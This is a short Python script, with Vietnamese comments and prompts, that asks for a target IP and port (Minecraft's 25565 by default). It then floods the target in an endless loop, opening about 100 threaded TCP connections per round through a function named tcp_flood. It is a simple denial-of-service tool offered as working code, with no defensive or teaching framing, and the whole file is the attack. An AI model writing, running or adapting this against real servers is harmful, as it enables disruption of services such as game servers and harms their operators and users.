import socket
import concurrent.futures
import time

# Nhập cấu hình từ người dùng
target_ip = input("Nhập IP máy chủ (mặc định: 127.0.0.1): ") or "127.0.0.1"
target_port = input("Nhập cổng máy chủ (mặc định: 25565): ")
target_port = int(target_port) if target_port else 25565

max_workers = input("Số luồng đồng thời (mặc định: 100): ")
max_workers = int(max_workers) if max_workers else 100

PACKETS_PER_ROUND = 100
SLEEP_BETWEEN_ROUNDS = 2

def tcp_flood(packet_id):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(1)
            sock.connect((target_ip, target_port))
            sock.sendall(b"Hello")
    except:
        pass  # Bỏ qua lỗi kết nối

round_count = 1
with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
    while True:
        start_time = time.time()

        futures = []
        for i in range(PACKETS_PER_ROUND):
            futures.append(executor.submit(tcp_flood, i))

        concurrent.futures.wait(futures)

        duration = time.time() - start_time
        print(f"[Đợt {round_count}] Đã gửi {PACKETS_PER_ROUND} packet trong {duration:.2f} giây. Nghỉ {SLEEP_BETWEEN_ROUNDS}s...\n")

        round_count += 1
        time.sleep(SLEEP_BETWEEN_ROUNDS)
